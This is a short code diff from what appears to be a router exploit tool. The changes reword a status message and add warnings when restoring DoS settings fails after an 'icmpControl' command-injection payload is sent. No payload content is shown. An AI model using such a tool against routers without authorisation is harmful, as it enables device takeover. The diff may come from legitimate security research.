@@ -801,7 +801,7 @@ class PasswordVector(Vector):
                 "vulnerable\n"
                 "    shell-out is absent. Builds before R2.0.19 behave this "
                 "way. The guest\n"
-                "    password changed, but nothing else was touched. Pass "
+                "    password changed; no password payload was sent. Pass "
                 "--force to send\n"
                 "    the payloads anyway.\n"
                 "    If the web UI still offers Backup and Restore, use the\n"
@@ -881,10 +881,20 @@ class DosPreventionVector(Vector):
                                f"{response.get('message', '')}")
             print(f"    {len(payload)}-char icmpControl payload sent")
         finally:
-            # The command has already run by the time the call returns. A
-            # restore failure must not hide the result of the injection.
-            with contextlib.suppress(Exception):
-                api.call("setDosPreventions", restore)
+            # The command has already run by the time the call returns. Report
+            # a failed restore as its own warning: it must not change the
+            # outcome, but the user has to know the settings may remain set.
+            try:
+                restored = api.call("setDosPreventions", restore)
+            except Exception as problem:
+                print("    warning: could not restore DoS settings "
+                      f"({type(problem).__name__}); check them in the router "
+                      "web UI", file=sys.stderr)
+            else:
+                if not Api._ok(restored):
+                    print("    warning: could not restore DoS settings "
+                          f"({restored.get('code', 'unknown')}); check them in "
+                          "the router web UI", file=sys.stderr)
 
 
 @dataclasses.dataclass
